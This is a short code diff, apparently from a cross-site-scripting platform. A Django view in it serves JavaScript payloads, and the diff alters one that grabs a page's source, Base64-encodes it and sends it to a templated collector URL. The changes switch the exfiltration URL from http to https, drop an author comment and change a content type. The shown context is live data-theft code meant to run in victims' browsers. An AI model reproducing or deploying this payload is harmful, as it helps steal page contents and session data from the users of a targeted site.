@@ -99,9 +99,9 @@ xmlHttp.send(null);
 function writeSource() {
   if (xmlHttp.readyState == 4) {
       var code = BASE64.encoder(xmlHttp.responseText);
-      //xssPost('http://{{domain}}/{{key}}?message='+code);
+      //xssPost('https://{{domain}}/{{key}}?message='+code);
 	  const Http = new XMLHttpRequest();
-	  const url='http://{{domain}}/{{key}}?message='+code;
+	  const url='https://{{domain}}/{{key}}?message='+code;
 	  Http.open("GET", url);
       Http.send();
   }
@@ -118,9 +118,6 @@ function writeSource() {
     de.style.display = 'none';
 }
 /**
- *create by 2012-08-25 pm 17:48
- *@author hexinglun@gmail.com
- *BASE64 Encode and Decode By UTF-8 unicode
  *可以和java的BASE64编码和解码互相转化
  */
 (function(){
@@ -357,7 +354,7 @@ function writeSource() {
                 for name in self.__dir__():
                     if name == item_name:
                         code = code + getattr(self, name)(i)
-            return HttpResponse(code, content_type='application/javascript')
+            return HttpResponse(code, content_type='application/x-javascript')
         except Exception as e:
             import traceback
             traceback.print_exc()
